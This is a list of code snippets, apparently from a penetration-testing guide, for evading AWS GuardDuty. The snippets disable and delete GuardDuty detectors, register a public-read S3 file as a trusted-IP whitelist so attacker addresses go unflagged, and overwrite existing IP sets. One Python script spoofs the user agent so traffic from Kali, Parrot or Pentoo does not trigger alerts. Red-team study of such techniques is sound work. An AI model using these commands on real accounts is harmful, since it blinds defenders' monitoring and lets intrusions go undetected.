["```\n aws guardduty list-detectors \n```", "```\naws guardduty update-detector --detector-id <ID of the detector we found> --no-enable \n```", "```\naws guardduty delete-detector --detector-id <ID of the detector we found> \n```", "```\n   aws guardduty list-detectors \n```", "```\n aws guardduty list-ip-sets --detector-id e2b19kks31n78f00931ma8b081642901 \n```", "```\n aws s3 cp ./ip-whitelist.txt s3://bucket-for-gd-whitelist\n```", "```\naws s3api put-object-acl --acl public-read --bucket bucket-for-gd-whitelist --key ip-whitelist.txt \n```", "```\n aws guardduty create-ip-set --detector-id e2b19kks31n78f00931ma8b081642901 --format TXT --location https://s3.amazonaws.com/bucket-for-gd-whitelist/ip-whitelist.txt --name Whitelist --activate\n```", "```\n run guardduty__whitelist_ip --path https://s3.amazonaws.com/bucket-for-gd-whitelist/ip-whitelist.txt\n```", "```\n aws guardduty get-ip-set --detector-id e2b19kks31n78f00931ma8b081642901 --ip-set-id 37w2992c2274llq7u4121o8af11j4971 \n```", "```\n{\n    \"Format\": \"TXT\",\n    \"Location\": \"https://s3.amazonaws.com/bucket-for-gd-whitelist/ip-whitelist.txt\",\n    \"Name\": \"Whitelist\",\n    \"Status\": \"ACTIVE\"\n}\n```", "```\n aws guardduty update-ip-set --detector-id e2b19kks31n78f00931ma8b081642901 --ip-set-id 37w2992c2274llq7u4121o8af11j4971 --location https://s3.amazonaws.com/our-own-bucket-for-gd-whitelist/our-own-ip-whitelist.txt --activate\n```", "```\n aws ec2 run-instances --region us-east-1 --image-id ami-0ac019f4fcb7cb7e6 --instance-type t2.micro --key-name <your ec2 ssh key name> --count 1 --user-data file://userdata.txt\n```", "```\n#!/bin/bash\napt-get update\napt-get install python3 python3-pip git -y\npip3 install awscli\ncd /root\ngit clone https://github.com/RhinoSecurityLabs/pacu.git\ncd pacu/\n/bin/bash install.sh\n```", "```\n aws-cli/1.16.89 Python/3.6.8 Linux/4.19.0-kali1-amd64 botocore/1.12.79 \n```", "```\n aws-cli/1.16.93 Python/3.6.8 Linux/4.19.0-parrot1-13t-amd64 botocore/1.12.83\n```", "```\n[aws-cli/1.16.93 Python/2.7.14 Linux/4.17.11-pentoo botocore/1.12.83] \n```", "```\n   signin.amazonaws.com \n```", "```\nprint(boto3.session.Session()._session.user_agent())\n```", "```\nimport random\n\nimport boto3\nimport botocore\n\n# A list of user agents that won't trigger GuardDuty\nsafe_user_agents = [\n 'Boto3/1.7.48 Python/3.7.0 Windows/10 Botocore/1.10.48',\n 'aws-sdk-go/1.4.22 (go1.7.4; linux; amd64)',\n 'aws-cli/1.15.10 Python/2.7.9 Windows/8 botocore/1.10.10'\n]\n\n# Grab the current user agent\nuser_agent = boto3.session.Session()._session.user_agent().lower()\n\n# Check if we are on Kali, Parrot, or Pentoo Linux against a lowercase version of the user agent\nif 'kali' in user_agent.lower() or 'parrot' in user_agent.lower() or 'pentoo' in user_agent.lower():\n # Change the user agent to a random one from the list of safe user agents\n user_agent = random.choice(safe_user_agents)\n\n# Prepare a botocore config object with our user agent\nbotocore_config = botocore.config.Config(\n user_agent=user_agent\n)\n\n# Create the boto3 client, using the botocore config we just set up\nclient = boto3.client(\n 'ec2',\n region_name='us-east-1',\n config=botocore_config\n)\n\n# Print out the results of our EC2 DescribeInstances call\nprint(client.describe_instances())\n```"]